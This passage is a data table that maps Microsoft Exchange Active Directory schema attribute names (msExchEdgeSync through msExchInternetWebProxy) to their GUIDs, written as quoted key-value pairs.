        "msExchEdgeSyncLockDuration" = "6b707d34-cdd3-49f9-8fe8-71340f7ce26d";
        "msExchEdgeSyncLockRenewalDuration" = "73ec8731-0344-4c49-94d1-5be8e001daf8";
        "msExchEdgeSyncLogEnabled" = "edeee318-eb28-44f8-93f6-97dae7f51f03";
        "msExchEdgeSyncLogLevel" = "1f906df0-9f66-4f99-b7db-ceb562380d02";
        "msExchEdgeSyncLogMaxAge" = "7bf93980-6f2c-488b-b376-6f0107792f07";
        "msExchEdgeSyncLogMaxDirectorySize" = "2cc4b84b-cc2c-45c6-8162-2e7dcdb7155c";
        "msExchEdgeSyncLogMaxFileSize" = "a417284e-20d4-4149-9cc1-d74d0e5be339";
        "msExchEdgeSyncLogPath" = "3da7d68e-cb5e-4539-8137-702ab1d7feaf";
        "msExchEdgeSyncMservBackupLeaseLocation" = "e09f3d19-94cc-484e-8d4f-5786a0a79b23";
        "msExchEdgeSyncMservConnector" = "6bfbb991-f11b-4a9f-b85e-6402e33f5390";
        "msExchEdgeSyncMservLocalCertificate" = "76149f84-e1ce-407f-a407-06000088cf3a";
        "msExchEdgeSyncMservPrimaryLeaseLocation" = "81c2b410-eace-4499-b331-dbd7f9b65a8c";
        "msExchEdgeSyncMservProvisionUrl" = "8fd5ab3b-efab-490d-8be9-5a584e8069f2";
        "msExchEdgeSyncMservRemoteCertificate" = "f026cf09-31cb-469a-bf69-d3dea918b1d9";
        "msExchEdgeSyncMservSettingUrl" = "34e2dd5b-df06-4e85-bb7a-7211b15efea5";
        "msExchEdgeSyncOptionDuration" = "0604233e-1d05-4e38-b4b7-df3dce7a9b2a";
        "msExchEdgeSyncProviderAssemblyPath" = "d48e9fc8-e1ed-4c74-b269-99c6f577e23d";
        "msExchEdgeSyncRecipientSyncInterval" = "465c8db3-2c1f-43cf-9865-28c57d7cc3e6";
        "msExchEdgeSyncRetryCount" = "6cd210f5-99be-4880-b41e-2ed4ffb85efb";
        "msExchEdgeSyncServiceConfig" = "190e1bba-7bf3-4f6d-a93b-3a7f375c23d9";
        "msExchEdgeSyncSourceGuid" = "eb476f59-8a60-4367-b3e7-f2bed757966d";
        "msExchEdgeSyncStatus" = "050f9910-3408-493e-96e1-cdc47ef18384";
        "msExchEdgeSyncSynchronizationProvider" = "74cd6ce3-6d16-497f-8c0f-303427fdb6e8";
        "msExchELCAdminDescriptionLocalized" = "08c2246f-fe2e-432f-b464-4d1c8113bcc2";
        "msExchELCAuditLogDirectorySizeLimit" = "4adad576-f27c-4754-b5db-d2becebabead";
        "msExchELCAuditLogFileAgeLimit" = "29deccd9-2fa9-4f30-abc1-874f8f44f925";
        "msExchELCAuditLogFileSizeLimit" = "bd345bf8-aee7-4851-93a9-970607c15632";
        "msExchELCAuditLogPath" = "d4b87ae0-f107-4a57-a303-efb5c49bf83d";
        "msExchELCAutoCopyAddressLink" = "52a4cbfc-5808-43d4-94f7-de19104fe215";
        "msExchELCContentSettings" = "bc3d75ac-f92d-40cd-a223-37b43b4232b8";
        "msExchELCExpiryAction" = "97bce56b-c573-4850-82a2-e21e20641532";
        "msExchELCExpiryAgeLimit" = "ff0ef8ef-cc6b-42ba-90d3-d37e58b3311d";
        "msExchELCExpiryDestinationLink" = "62221a15-cbaf-4ebb-9b9c-74f59e1da8a9";
        "msExchELCExpirySuspensionEnd" = "34101173-1670-48a5-9928-648dddbb7000";
        "msExchELCExpirySuspensionStart" = "3bd0b7b0-ee14-4b4f-bc04-fbb2e441c226";
        "msExchELCFlags" = "2aa7c06e-1666-4cab-aa0b-2c7221f91051";
        "msExchELCFolder" = "fdb7ddb7-8d54-4fa8-9728-33da6c89bfe4";
        "msExchELCFolderBL" = "248ba72b-8e16-4efb-9127-e307e6e875ac";
        "msExchELCFolderLink" = "7111e513-9e92-4171-9174-4f866c2d7369";
        "msExchELCFolderName" = "6f859570-db5c-4563-8842-ddd84dd5de23";
        "msExchELCFolderNameLocalized" = "176d1e13-4e1e-405c-94c7-294ed2b737e6";
        "msExchELCFolderQuota" = "d104e7e1-52f3-4618-8e8c-8ddc911a31d5";
        "msExchELCFolderType" = "0316e35a-2393-4410-b6fe-9abd7041482a";
        "msExchELCLabel" = "98a01a24-2fd8-4e38-a418-6b1498c0501c";
        "msExchELCMailboxFlags" = "3f8950e3-db72-40e3-8ae8-3107fa5e6eed";
        "msExchELCMessageClass" = "3d48cc67-2f1d-40b0-8bba-9794d4efe146";
        "msExchELCOrganizationalRootURL" = "f57e74a8-0866-418d-8340-239fcefd83d9";
        "msExchELCSchedule" = "4c41dc66-8c6b-4da0-b482-5349af59d962";
        "msExchEnableInternalEvaluator" = "9a56980f-283c-4f86-8395-23011350600c";
        "msExchEnableModeration" = "6acd2d67-7046-4958-8bd7-71cebc68b8a7";
        "msExchEncodeSMTPRelay" = "3a633f17-5194-11d3-aa77-00c04f8eedd8";
        "msExchEncryptedAnonymousPassword" = "5dc055fc-5c3f-4a6f-a34a-4dbcb68e2ad0";
        "msExchEncryptedPassword" = "08c63250-0df6-405d-8907-0312dd1aa145";
        "msExchEncryptedPassword2" = "dcbc61e9-9279-44d1-b494-25562659db75";
        "msExchEncryptedTLSP12" = "5a499bcd-56cb-4896-b7bf-365c75da7f2d";
        "msExchEncryptedTransportServiceKPK" = "cdde1c9e-d38a-458e-83d0-2e5ec8e379ab";
        "msExchEncryptionRequired" = "eaeb8f95-23e0-45dd-aeef-566ac84836ab";
        "msExchESEParamAssertAction" = "2d09783d-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamBackgroundDatabaseMaintenance" = "be97c4fc-311f-448c-820a-38339b254873";
        "msExchESEParamBackgroundDatabaseMaintenanceDelay" = "83744365-5db8-40e7-a25d-1b45df31e27e";
        "msExchESEParamBackgroundDatabaseMaintenanceIntervalMax" = "09871b25-7ae2-4fae-971a-063467e2157e";
        "msExchESEParamBackgroundDatabaseMaintenanceIntervalMin" = "89ae6bb0-208d-475f-86bf-be6a43b4e573";
        "msExchESEParamBackgroundDatabaseMaintenanceSerialization" = "5caaffb3-fe60-4e20-8278-77a192522cd3";
        "msExchESEParamBaseName" = "2d097845-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamCachedClosedTables" = "d19c67f8-a0eb-432a-bedd-af10cd7da25c";
        "msExchESEParamCachePriority" = "859eb1aa-ad13-41e2-8705-a1cb0eb3c4aa";
        "msExchESEParamCacheSize" = "9eb8339e-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamCacheSizeMax" = "9ed73230-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamCacheSizeMin" = "2d097841-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamCheckpointDepthMax" = "2d09785a-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamCircularLog" = "9ef8931c-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamCommitDefault" = "2d097849-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamCopyLogFilePath" = "b8cb4a11-6962-4c27-8239-2f3228bcbb0b";
        "msExchESEParamCopySystemPath" = "29d6828a-1bdc-4b07-9de8-5252fdffcd98";
        "msExchESEParamDbExtensionSize" = "2d09784d-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamEnableIndexChecking" = "2d097838-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamEnableOnlineDefrag" = "2d097833-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamEnableSortedRetrieveColumns" = "2d097828-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamEventSource" = "9f19f408-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamGlobalMinVerPages" = "02e831da-2f29-11d3-aa6c-00c04f8eedd8";
        "msExchESEParamHungIOAction" = "a187fbbc-03b6-4674-8d17-bcf322ea7db4";
        "msExchESEParamHungIOThreshold" = "9be12d5e-41d2-420b-b717-6f0952dd1a2c";
        "msExchESEParamLogBuffers" = "9f38f29a-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamLogCheckpointPeriod" = "9f5a5386-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamLogFilePath" = "9f795218-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamLogFileSize" = "9f9ab304-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamLogWaitingUserMax" = "9fbe764a-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamMaxCursors" = "2d097830-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamMaxOpenTables" = "9fdfd736-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamMaxSessions" = "9ffed5c8-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamMaxTemporaryTables" = "2d09782c-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamMaxVerPages" = "a02036b4-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamPageFragment" = "2d097855-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamPageTempDBMin" = "2d097851-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchESEParamPreferredMaxOpenTables" = "a04197a0-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamPreferredVerPages" = "a062f88c-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamPreReadIOMax" = "711125ae-f88b-4305-9b3d-b16de278b607";
        "msExchESEParamReplayBackgroundDatabaseMaintenance" = "a983d737-96cb-44f7-9055-7c43c01f6c5f";
        "msExchESEParamReplayBackgroundDatabaseMaintenanceDelay" = "4d7ea1cd-43a0-4255-9bb0-12f17be23ffb";
        "msExchESEParamReplayCachePriority" = "88bcfa94-12e0-4cef-ad45-7509d58265dd";
        "msExchESEParamReplayCheckpointDepthMax" = "464982d0-ea49-4629-86c6-56804302b17c";
        "msExchESEParamReplayPreReadIOMax" = "6d09837e-0f8c-45a5-bd48-7537ce9267eb";
        "msExchESEParamStartFlushThreshold" = "92abc93e-b09e-11d2-aa06-00c04f8eedd8";
        "msExchESEParamStopFlushThreshold" = "92c6031c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchESEParamSystemPath" = "a086bbd2-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamTempPath" = "a0a5ba64-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamWaitLogFlush" = "a0c71b50-b093-11d2-aa06-00c04f8eedd8";
        "msExchESEParamZeroDatabaseDuringBackup" = "a0e619e2-b093-11d2-aa06-00c04f8eedd8";
        "msExchEventHistoryRetentionPeriod" = "027e6f41-6161-431d-9830-22de0e8e1393";
        "msExchEwsApplicationAccessPolicy" = "f3631031-d0bf-40f3-8119-5bcffef0329c";
        "msExchEwsEnabled" = "32c1e94c-a8fe-4af5-ad74-9b311e407482";
        "msExchEwsExceptions" = "ff76464a-788e-45cb-bc42-b0fd557d7e6d";
        "msExchEWSThrottlingPolicyState" = "d0184432-77d2-4a14-9727-aeda8c386408";
        "msExchEwsWellKnownApplicationPolicies" = "8578b3b3-846b-4738-8908-4c9f6c4bd981";
        "msExchExchangeAssistance" = "f689cfc2-b7a2-4297-908f-38b4ec1290a4";
        "msExchExchangeHelpAppOnline" = "55a72340-e3f9-4f42-8f40-584b66bf7063";
        "msExchExchangeRPCServiceArrayBL" = "90c10e46-529c-415b-8deb-ac37fad10757";
        "msExchExchangeRPCServiceArrayLink" = "e74615fc-fa9b-40e5-ad9f-ef8c2fc26600";
        "msExchExchangeServer" = "01a9aa9c-a981-11d2-a9ff-00c04f8eedd8";
        "msExchExchangeServerLink" = "a1051874-b093-11d2-aa06-00c04f8eedd8";
        "msExchExchangeServerPolicy" = "e497942f-1d42-11d3-aa5e-00c04f8eedd8";
        "msExchExchangeServerRecipient" = "58b55fb8-ce43-4987-b313-bf94abd81db3";
        "msExchExchangeSite" = "24d808f5-2439-11d3-aa66-00c04f8eedd8";
        "msExchExcludedMailboxDatabases" = "5eafe7cd-c073-4552-b913-a3479e5ec4a2";
        "msExchExpansionServerName" = "a1241706-b093-11d2-aa06-00c04f8eedd8";
        "msExchExportContainersBL" = "2436ac3e-1d4e-11d3-aa5e-00c04f8eedd8";
        "msExchExportContainersLinked" = "3b7ea364-1d4d-11d3-aa5e-00c04f8eedd8";
        "msExchExportDLs" = "a14577f2-b093-11d2-aa06-00c04f8eedd8";
        "msExchExtendedProtectionSPNList" = "ac04ee70-12cc-452d-8c72-3b94040e480d";
        "msExchExtensionAttribute16" = "f062af7a-2a57-4ab2-89b6-2a70c21314a4";
        "msExchExtensionAttribute17" = "556b3ede-9483-430a-8740-09c99959da33";
        "msExchExtensionAttribute18" = "eceada5a-6d17-4dc9-bc65-749c0db1aa48";
        "msExchExtensionAttribute19" = "8517f7db-da0b-475b-ae3d-41eefcd9916e";
        "msExchExtensionAttribute20" = "ea85b204-f40c-404c-b5fa-6cd513f73533";
        "msExchExtensionAttribute21" = "a71ebf91-bf5b-40aa-802f-04a91526ceba";
        "msExchExtensionAttribute22" = "fcf0090f-a56e-47cb-88f7-58253327a015";
        "msExchExtensionAttribute23" = "5739f85f-b620-47de-ba3b-9ae1a380ca61";
        "msExchExtensionAttribute24" = "3532a11d-368f-4600-a1d1-61abd3c85bf3";
        "msExchExtensionAttribute25" = "f1a4b98a-02a4-49f9-9cfa-924cf6135ef7";
        "msExchExtensionAttribute26" = "e5c54b7f-b0e6-4f1e-848d-a82f9ed6f29a";
        "msExchExtensionAttribute27" = "5431434e-dc7a-4a88-9af6-a9cf8e78f343";
        "msExchExtensionAttribute28" = "32cfc5e2-8c5f-4681-879b-ff9bc62d0ed4";
        "msExchExtensionAttribute29" = "1028684c-d7ee-4407-8bff-82acfdf29b3c";
        "msExchExtensionAttribute30" = "4ad06406-dd97-45d3-a212-8edee1488db2";
        "msExchExtensionAttribute31" = "a64f4402-05f5-45df-b6df-7bc725182213";
        "msExchExtensionAttribute32" = "b847bc89-c5a4-448a-bf73-b53308bd0c17";
        "msExchExtensionAttribute33" = "be706a59-fc9c-41e5-ad48-fc2bbad3adc8";
        "msExchExtensionAttribute34" = "14516706-eb3c-4df0-9ae3-a0f9ebff4c76";
        "msExchExtensionAttribute35" = "4782a77f-5ecd-42ee-9d6a-042cf6c08e78";
        "msExchExtensionAttribute36" = "0490fe13-8c0e-4376-b571-bcc4e4d30202";
        "msExchExtensionAttribute37" = "e2fff0bf-e680-46ee-a18d-ec4b40ef0ebf";
        "msExchExtensionAttribute38" = "d386fda6-988c-4220-86a4-1571600f25ab";
        "msExchExtensionAttribute39" = "019ec2e0-f8ce-4cd3-8c83-9fe86b6ac469";
        "msExchExtensionAttribute40" = "d5915f32-3d32-458d-b395-e3b386bb8766";
        "msExchExtensionAttribute41" = "c9d118fd-82a7-4225-a1c2-2c736e3842c7";
        "msExchExtensionAttribute42" = "3e037ce9-b2b6-4b9f-bce4-e7a674b4dffa";
        "msExchExtensionAttribute43" = "e2753a3b-452f-457e-9f17-deba14dba156";
        "msExchExtensionAttribute44" = "a5624177-d4db-4924-8360-cc6641c32eba";
        "msExchExtensionAttribute45" = "2d307010-e948-4e3f-90ff-cff8c5ca9499";
        "msExchExtensionCustomAttribute1" = "2ec41df1-3996-4a23-a355-0d1f4c8ad23f";
        "msExchExtensionCustomAttribute2" = "7da4c68a-d06c-4793-b77b-b9a0b76c0fde";
        "msExchExtensionCustomAttribute3" = "2dae80e7-d302-4295-991d-be11106f8040";
        "msExchExtensionCustomAttribute4" = "67025ca8-e71f-4ebc-b4ef-b0aa60161588";
        "msExchExtensionCustomAttribute5" = "cedc39a5-86a9-4f38-8b17-072dd70ff2c9";
        "msExchExternalAuthenticationMethods" = "33570c36-9686-45e3-9683-cd83bb7538da";
        "msExchExternalDirectoryObjectId" = "6914bea6-3922-4c20-9f33-5e62962d5d4e";
        "msExchExternalDirectoryOrganizationId" = "0fdd91a6-a955-4ec0-8b91-10ff6fadeaa5";
        "msExchExternalHostName" = "d430d4c4-0ae2-49b2-91df-378a005eb36a";
        "msExchExternalOOFOptions" = "75617923-18b4-4166-9971-e9e788b314a1";
        "msExchExternalSyncState" = "e1ea7f62-1942-4d30-9248-0ca32b098d21";
        "msExchFBURL" = "a166d8de-b093-11d2-aa06-00c04f8eedd8";
        "msExchFedAcceptedDomainBL" = "7e9f0dd7-bf1e-4bae-8da9-bc87f38dc2a9";
        "msExchFedAcceptedDomainLink" = "ff792179-9a83-43e9-948e-7bf24d35bf5f";
        "msExchFedAccountNamespace" = "1ddc7fdd-8fae-437a-b4a4-6b6bfa579799";
        "msExchFedAdminKey" = "33d1cb0f-0599-4c92-ab6f-cbf107b94251";
        "msExchFedApplicationId" = "50051c9f-0424-4b59-9755-2e2da053941d";
        "msExchFedApplicationURI" = "062bebb1-5b9d-4936-9271-dbbf881b6f43";
        "msExchFedClientTrust" = "6c11692b-b922-44a8-a706-4ae4e2190d6a";
        "msExchFedDelegationTrust" = "b3d4aa13-6814-41a1-b6f9-7c0eb8c991eb";
        "msExchFedDomainNames" = "f4be9e0c-f7a9-4131-942f-8c14903eb0b3";
        "msExchFedEnabledActions" = "ec7be788-7139-4ada-a24f-fd3f09b5d15f";
        "msExchFedIsEnabled" = "41c7bcf8-f4fa-4dd9-9491-d4296dcef67f";
        "msExchFedLocalRecipientAddress" = "7917781c-3fb3-4628-b022-e916780df709";
        "msExchFedMetadataEPR" = "356edf0d-8cf6-4e2b-9172-fb89e44dadc0";
        "msExchFedMetadataPollInterval" = "1089ed64-9168-42f9-86e8-64221de296cf";
        "msExchFedMetadataPutEPR" = "3824e24d-8937-4521-abf0-22958526074f";
        "msExchFedOrgAdminContact" = "040adfd5-9816-4905-827d-d3997a0dba29";
        "msExchFedOrgApprovalContact" = "f2bbc376-8686-49b5-bf6f-f455ad2ae484";
        "msExchFedOrgCertificate" = "ccd7b1e5-0351-45e6-afcc-6a2f38aebf1e";
        "msExchFedOrgId" = "9cd6d525-22a7-4f7f-9d44-3d687f47cef9";
        "msExchFedOrgNextCertificate" = "ac19bcdc-30cb-4379-8c59-9645798285de";
        "msExchFedOrgNextPrivCertificate" = "a8e1b4e0-f68f-4ea1-8cf1-9a0deed8451e";
        "msExchFedOrgPrevCertificate" = "3314b2cd-b769-452a-82d7-7360ef198204";
        "msExchFedOrgPrevPrivCertificate" = "60fc7fac-a42f-4f8d-b9f7-9f9f5727b906";
        "msExchFedOrgPrivCertificate" = "72d28aa7-0e6e-4325-a64b-39b8ae56cb46";
        "msExchFedPolicyReferenceURI" = "b7ce95d1-58fe-4c25-9f4e-e3e4ccf19e69";
        "msExchFedProvisioningProvider" = "74ff436e-2917-4528-94da-30f912557141";
        "msExchFedRemoteTargetAddress" = "78bf1248-6dcc-4764-8292-e550c78632ae";
        "msExchFedSharingRelationship" = "5b134627-ce78-4d08-b31b-974cde19831a";
        "msExchFedTargetApplicationURI" = "b16cfbee-902e-4154-889a-7e8f6e226433";
        "msExchFedTargetAutodiscoverEPR" = "1a6007c1-788a-4988-81cd-500578e6ef65";
        "msExchFedTargetOWAURL" = "d588b7f7-c24b-410f-84a0-e7bcd4ed3a82";
        "msExchFedTargetSharingEPR" = "1ca3a3f6-5d66-4dd5-8cf4-fc18c541d776";
        "msExchFedTokenIssuerCertificate" = "55d9cdf7-2165-44c3-98fc-6f723fc8d4d1";
        "msExchFedTokenIssuerCertReference" = "f32c11c2-b5e2-4e12-90e8-7986100122fc";
        "msExchFedTokenIssuerEPR" = "0a189358-32eb-4b3b-9c5b-33ee7b87db63";
        "msExchFedTokenIssuerMetadataEPR" = "f7eb94ea-dbc0-40cb-a164-3533e04bb810";
        "msExchFedTokenIssuerPrevCertificate" = "42f2514d-9dcc-4691-ad94-c7451e500187";
        "msExchFedTokenIssuerPrevCertReference" = "6b085eee-1199-4fee-a703-907c1a348982";
        "msExchFedTokenIssuerType" = "0d953b93-2ce6-4927-a534-9a82be8bd2b9";
        "msExchFedTokenIssuerURI" = "1edf6f3b-985f-4067-b7ef-0eccfe54e5f0";
        "msExchFedTrust" = "294c5a23-d02c-41f4-ab29-183158ebc593";
        "msExchFedWebRequestorRedirectEPR" = "2b439ef6-a628-4e73-8624-0a85b8149f9a";
        "msExchFileShareWitness" = "8d0abb53-0e8e-474e-b4b1-a7457cb6b022";
        "msExchFileShareWitnessDirectory" = "7c9b0215-0113-495f-8d88-4b14bddacf6b";
        "msExchFirstInstance" = "8a8f2908-b09e-11d2-aa06-00c04f8eedd8";
        "msExchFirstSyncTime" = "4329850e-db55-403e-baeb-825c3fab97d8";
        "msExchFolderAffinityCustom" = "5070257a-85b7-4ed4-b2e2-51f726684c58";
        "msExchFolderAffinityList" = "3592bc80-1117-4962-aa50-38c6e69bbb91";
        "msExchForeignForestFQDN" = "e5fbfbc3-a59f-4b30-88c1-dfd632833cb3";
        "msExchForeignForestOrgAdminUSGSid" = "6696c047-41bd-4c2f-9aae-46b7aa698475";
        "msExchForeignForestPublicFolderAdminUSGSid" = "840ea0dd-ae15-4b37-b6d3-c8a7bc5e46e9";
        "msExchForeignForestReadOnlyAdminUSGSid" = "155b65d1-7180-446a-b19e-846b931eb009";
        "msExchForeignForestRecipientAdminUSGSid" = "ed09a363-0a6f-47ff-8361-f16c8e595ff5";
        "msExchForeignForestServerAdminUSGSid" = "2a38ce3d-73ad-46c7-bcb0-22ed3514f555";
        "msExchForeignGroupSID" = "0eeab70b-5756-46fd-8597-bd47331579a0";
        "msExchGalsyncDisableLiveIdOnRemove" = "f2a6e827-9d1c-45a6-9fa2-941da740701f";
        "msExchGalsyncFederatedTenantSourceAttribute" = "76db3af7-7cdf-4cf5-a203-c078f9e1f28d";
        "msExchGalsyncLastSyncRun" = "a1907194-750c-4601-b0bf-40ed78bb9fa8";
        "msExchGalsyncPasswordFilePath" = "f942015c-7bc0-41f2-bb56-d472feeb9f4b";
        "msExchGalsyncProvisioningDomain" = "382b1f99-8c4e-4755-b1ea-555b41947c09";
        "msExchGalsyncResetPasswordOnNextLogon" = "1848ae41-c721-4b75-aa23-c6d43c6d63f6";
        "msExchGalsyncSchedule" = "8863a3fd-6696-4841-9dc6-1aa0fcc1936e";
        "msExchGalsyncSourceActiveDirectorySchemaVersion" = "4f4cb885-7191-4c01-adce-2d295fdc768d";
        "msExchGalsyncWlidUseSmtpPrimary" = "a7d14990-9f21-4151-b26e-ed55dd306917";
        "msExchGeneralThrottlingPolicyState" = "64b860ac-9c2e-4eaf-ba61-7044fea30d3d";
        "msExchGenericForwardingAddress" = "df508c92-2301-43ca-ac2d-ea8f1326c16b";
        "msExchGenericPolicy" = "e32977cd-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchGenericPolicyContainer" = "e32977c3-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchGlobalAddressListBL" = "22be7485-72a1-46c2-9f35-e1d0d2b2df1d";
        "msExchGlobalAddressListLink" = "8dd05fe2-da5f-40d8-a15c-afb9107d8373";
        "msExchGracePeriodAfter" = "a1d6e764-b093-11d2-aa06-00c04f8eedd8";
        "msExchGracePeriodPrior" = "a1f84850-b093-11d2-aa06-00c04f8eedd8";
        "msExchGroupDepartRestriction" = "b20aae98-7fc2-42ac-b871-ab26a86f8ba0";
        "msExchGroupJoinRestriction" = "b90223eb-dee6-40cd-ba67-b236fabdfda3";
        "msExchGroupWiseConnector" = "91eaaac4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchGWiseAPIGateway" = "c7e96933-bd80-44a2-a535-ec744ea5f54f";
        "msExchGWiseAPIGatewayPath" = "3b9d8dea-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchGWiseFilterType" = "3b9d8dee-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchGWiseForeignDomain" = "3b9d8df3-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchGWisePassword" = "3b9d8df9-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchGWiseUserId" = "3b9d8e00-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchHABChildDepartmentsBL" = "3653a12c-f48d-46e5-83b4-0eaf6ae1ef67";
        "msExchHABChildDepartmentsLink" = "1d1695e5-6292-462b-a3f4-676133e791e6";
        "msExchHABRootDepartmentBL" = "0f95828c-2abd-4087-b026-8f7cc5e752a4";
        "msExchHABRootDepartmentLink" = "3ab0f77f-a103-47f5-806d-4a40cce638aa";
        "msExchHABShowInDepartments" = "a074aa51-ecc7-438a-98f8-eb257cbf4b59";
        "msExchHABShowInDepartmentsBL" = "95e2470c-8ea8-47b1-9545-b123ffc051b2";
        "msExchHasLocalCopy" = "03c165c8-9bd9-4934-8ae6-06baa7898d02";
        "msExchHideFromAddressLists" = "a21c0b96-b093-11d2-aa06-00c04f8eedd8";
        "msExchHomePublicMDB" = "a23fcedc-b093-11d2-aa06-00c04f8eedd8";
        "msExchHomeRoutingGroup" = "f649deed-1c26-4ed4-b639-f333a4850bc2";
        "msExchHomeRoutingGroupDNBL" = "a2612fc8-b093-11d2-aa06-00c04f8eedd8";
        "msExchHomeServerName" = "a284f30e-b093-11d2-aa06-00c04f8eedd8";
        "msExchHomeSyncService" = "a2a3f1a0-b093-11d2-aa06-00c04f8eedd8";
        "msExchHostServerBL" = "7b9ae869-58b5-4c1d-afcc-277d273131f9";
        "msExchHostServerLink" = "581d0851-f7e8-4545-8d72-0f7a0eba550e";
        "msExchHostServerName" = "6eea9a6f-0fd5-4d5f-8b6e-a3b905de4938";
        "msExchHouseIdentifier" = "a8df7407-c5ea-11d1-bbcb-0080c76670c0";
        "msExchHttpProtocolLogAgeQuotaInHours" = "b42a8375-e9b4-45b7-b850-922f29dca497";
        "msExchHTTPProtocolLogDirectorySizeQuota" = "5cbc46a4-d065-4eb5-ada6-040dfb1084b3";
        "msExchHTTPProtocolLogFilePath" = "8df30033-f795-4b68-977e-acf575026723";
        "msExchHTTPProtocolLogLoggingLevel" = "c3a4e931-d0e6-4bd3-b181-376fd27a5ac7";
        "msExchHTTPProtocolLogPerFileSizeQuota" = "6e45e870-afac-4b33-af1b-4dd2ffa2f8fe";
        "msExchIFSPrivateEnabled" = "a2e915d2-b093-11d2-aa06-00c04f8eedd8";
        "msExchIFSPrivateName" = "a30a76be-b093-11d2-aa06-00c04f8eedd8";
        "msExchIFSPublicEnabled" = "a32bd7aa-b093-11d2-aa06-00c04f8eedd8";
        "msExchIFSPublicName" = "a34d3896-b093-11d2-aa06-00c04f8eedd8";
        "msExchIMACL" = "06551010-2845-11d3-aa68-00c04f8eedd8";
        "msExchIMAddress" = "cbbd3752-b8d8-47dc-92ee-ab488c1af969";
        "msExchIMAP4Settings" = "16a788e9-bfff-4b25-a790-cc2775aa6221";
        "msExchIMAPOWAURLPrefixOverride" = "5e26dd2a-9b0a-4219-8183-20ad44f5cbdf";
        "msExchIMAPThrottlingPolicyState" = "ad6ac527-8305-4d09-87e7-018a9121f5d9";
        "msExchIMDBLogPath" = "a4394164-b093-11d2-aa06-00c04f8eedd8";
        "msExchIMDBPath" = "a45aa250-b093-11d2-aa06-00c04f8eedd8";
        "msExchIMFirewall" = "9f116ebe-284e-11d3-aa68-00c04f8eedd8";
        "msExchIMFirewallType" = "06550ffc-2845-11d3-aa68-00c04f8eedd8";
        "msExchIMGlobalSettingsContainer" = "9f116eb8-284e-11d3-aa68-00c04f8eedd8";
        "msExchIMHostName" = "807b6084-439b-11d3-aa72-00c04f8eedd8";
        "msExchIMIPRange" = "0655100b-2845-11d3-aa68-00c04f8eedd8";
        "msExchIMMetaPhysicalURL" = "8e7a93a3-5a7c-11d3-aa78-00c04f8eedd8";
        "msExchImmutableId" = "dc95eaf8-e057-4e84-9d76-da19bedab45b";
        "msExchIMPhysicalURL" = "8e7a93a8-5a7c-11d3-aa78-00c04f8eedd8";
        "msExchImportContainerLinked" = "9ff15c4c-1ec9-11d3-aa5e-00c04f8eedd8";
        "msExchIMProxy" = "06551002-2845-11d3-aa68-00c04f8eedd8";
        "msExchIMRecipient" = "028502f4-a981-11d2-a9ff-00c04f8eedd8";
        "msExchIMServerHostsUsers" = "8d6b1af6-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIMServerIISId" = "8d3444e0-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIMServerName" = "8d4e7ebe-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIMVirtualServer" = "41e8fd82-8f37-4e56-a44a-33a3e6b7526c";
        "msExchIncludedMailboxDatabases" = "a3ede72c-f37c-44dc-afec-b83158e51342";
        "msExchIncomingConnectionTimeout" = "a64cedca-b093-11d2-aa06-00c04f8eedd8";
        "msExchInconsistentState" = "1d80475f-e7b4-4005-af4d-82bcbf407c3c";
        "msExchIndustry" = "027dba48-100b-4e9d-8819-85fc685a4179";
        "msExchInformationStore" = "031b371a-a981-11d2-a9ff-00c04f8eedd8";
        "msExchInstalledComponents" = "99f5865d-12e8-11d3-aa58-00c04f8eedd8";
        "msExchInstallPath" = "8a23df36-b09e-11d2-aa06-00c04f8eedd8";
        "msExchIntendedMailboxPlanBL" = "495d9d0a-8913-4be3-a71b-44e60f2b3705";
        "msExchIntendedMailboxPlanLink" = "118bc9c7-5fc2-4e8d-9f81-dd28542784f3";
        "msExchIntendedServicePlan" = "d39ee7c3-430f-4329-b705-ac24a5085f18";
        "msExchInternalAuthenticationMethods" = "a86c1d2a-2ef8-4096-9d89-d3de2b297f02";
        "msExchInternalHostName" = "50b874ea-d760-47aa-a89a-0e7d276f9926";
        "msExchInternalNLBBypassHostName" = "7a063128-5aeb-42a5-8c90-a46b333915de";
        "msExchInternalSMTPServers" = "310db99f-6369-4010-9818-eafcb2070181";
        "msExchInternetName" = "a670b110-b093-11d2-aa06-00c04f8eedd8";
        "msExchInternetWebProxy" = "dd1d8245-ffde-47b1-98cd-fcf86a136b20";
